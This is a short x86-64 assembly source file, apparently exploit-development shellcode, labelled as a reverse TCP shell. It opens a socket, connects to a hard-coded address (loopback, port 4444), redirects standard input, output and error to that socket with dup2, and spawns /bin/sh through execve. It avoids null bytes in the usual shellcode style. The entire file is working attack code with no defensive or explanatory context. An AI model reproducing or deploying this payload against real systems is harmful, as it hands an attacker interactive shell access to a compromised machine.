; reverse tcp shell


global _start

section .text

_start:
	; -----------------------------------------------------
	; clearing all registers
	xor rbx, rbx
	xor rax, rax
	mov rdi, rax
	mov rsi, rdi
	mov rdx, rsi
	; ------------------------------------------------------

	; ------------------------------------------------------
	; socket() - syscall 41
	add al, 41
	inc rdi
	inc rdi
	inc rsi
	syscall
	; ------------------------------------------------------

	; ------------------------------------------------------
	; copy socket descriptor to rdi for future use
	mov rdi, rax
	; ------------------------------------------------------

	; ------------------------------------------------------
	; connect() - Syscall 42
	mov rax, rbx
	push rax

	mov dword [rsp-4], 0x0100007f
	mov word [rsp-6], 0x5c11
	mov word [rsp-8], 0x2
	sub rsp, 8
	
	add al, 42
	mov rsi, rsp
	mov rdx, rax
	sub rdx, 26
	syscall
	; -------------------------------------------------------

	; -------------------------------------------------------
	; dup2() - Syscall 33
	xor rax, rax
	mov rsi, rax
	add al, 33
	syscall

	xor rax, rax
        inc rsi
        add al, 33
        syscall

	xor rax, rax
        inc rsi
        add al, 33
        syscall
	; --------------------------------------------------------

	; --------------------------------------------------------
	; execve() - Syscall 59
        xor rax, rax
        push rax
        mov rbx, 0x68732f2f6e69622f
        push rbx
        mov rdi, rsp
        push rax
        mov rdx, rsp
        push rdi
	mov rsi, rsp
        add rax, 59
        syscall
	; ---------------------------------------------------------

